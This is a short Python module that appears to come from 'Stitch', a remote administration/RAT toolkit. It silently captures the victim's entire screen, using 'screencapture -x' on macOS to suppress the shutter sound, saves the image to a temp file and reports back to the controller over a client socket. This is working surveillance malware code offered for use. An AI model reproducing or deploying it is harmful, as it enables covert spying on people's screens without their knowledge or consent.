# Copyright (c) 2017, Nathan Lopez
# Stitch is under the MIT license. See the LICENSE file at the root of the project for the detailed license terms.

import os
import sys
from os import rename
from os.path import isfile
from mss import ScreenshotError

temp = get_temp()

o = os.path.join(temp,'fs.jpg')
try:
    with MSS() as screen_captureter:
        if osx_client():
            result=run_command('screencapture -x {}'.format(o))
            if not no_error(result):
                screen_captureter.max_displays = 32
                next(screen_captureter.save(mon=-1, output=o))
        else:
            #print("\nA screen_capture to grab them all")
            next(screen_captureter.save(mon=-1, output=o))
        send(client_socket,'[+] Screenshot has been taken!')
except ScreenshotError as ex:
    err = "ERROR: {}".format(ex)
    send(client_socket,err)
